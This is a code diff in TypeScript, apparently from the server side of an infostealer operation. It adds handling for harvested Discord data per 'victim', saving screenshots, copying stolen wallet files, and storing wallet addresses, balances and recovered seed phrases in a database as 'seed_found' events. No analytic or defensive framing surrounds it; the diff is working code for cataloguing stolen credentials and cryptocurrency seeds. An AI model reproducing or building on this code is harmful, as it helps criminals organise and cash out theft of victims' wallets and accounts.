@@ -273,6 +273,18 @@ async function processDiscordArtifact(artifact: Artifact): Promise<void> {
       manifest.artifacts.push({ id: `e${++index}`, path: rel, kind: rel.toLowerCase().endsWith('.json') ? 'json' : 'file', size: data.length, sha256: sha256hex(data) });
     }
     await indexHarvest(artifact.victimId, artifact.id, manifest.artifacts.map((item) => item.path), root);
+    for (const item of manifest.artifacts) {
+      if (item.path.toLowerCase().endsWith('.png')) {
+        await prisma.screenshot.create({ data: { victimId: artifact.victimId, artifactId: artifact.id, ts: new Date() } });
+        break;
+      }
+    }
+  } else if (name.endsWith('.json') && (name.startsWith('wallets') || name.includes('wallets'))) {
+    const dest = join(root, 'wallets.json');
+    const data = await readFile(artifact.containerPath);
+    await writeFile(dest, data);
+    manifest.artifacts.push({ id: 'e1', path: 'wallets.json', kind: 'index', size: data.length, sha256: sha256hex(data) });
+    await indexWalletJson(artifact.victimId, artifact.id, dest);
   } else if (name.endsWith('.png')) {
     const dest = join(root, 'screenshot.png');
     await writeFile(dest, await readFile(artifact.containerPath));
@@ -343,6 +355,27 @@ async function indexHarvest(victimId: string, artifactId: string, paths: string[
     if (path.endsWith('findings.txt') || path.includes('findings-')) {
       await indexTextFile(victimId, join(root, path), path);
     }
+  }
+}
+
+async function indexWalletJson(victimId: string, artifactId: string, path: string): Promise<void> {
+  try {
+    const parsed = JSON.parse(await readFile(path, 'utf8')) as {
+      wallets?: Array<{ id: string; kind: string; path: string; state: string; reason?: string; address?: string; balance?: string }>;
+      seeds?: Array<{ path: string; kind: string; value: string; words?: number }>;
+    };
+    for (const wallet of parsed.wallets ?? []) {
+      await prisma.wallet.upsert({
+        where: { victimId_path: { victimId, path: wallet.path } },
+        update: { artifactId, kind: wallet.kind, targetId: wallet.id, state: wallet.state as never, reason: wallet.reason ?? 'discord_scan', address: wallet.address ?? null, balance: wallet.balance ?? null },
+        create: { victimId, artifactId, kind: wallet.kind, targetId: wallet.id, path: wallet.path, state: wallet.state as never, reason: wallet.reason ?? 'discord_scan', address: wallet.address ?? null, balance: wallet.balance ?? null }
+      });
+    }
+    for (const seed of parsed.seeds ?? []) {
+      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: seed.kind, value: seed.value, words: seed.words ?? 0, path: seed.path, source: 'discord_scan' } } });
+    }
+  } catch {
+    // malformed index still remains in Files
   }
 }
 
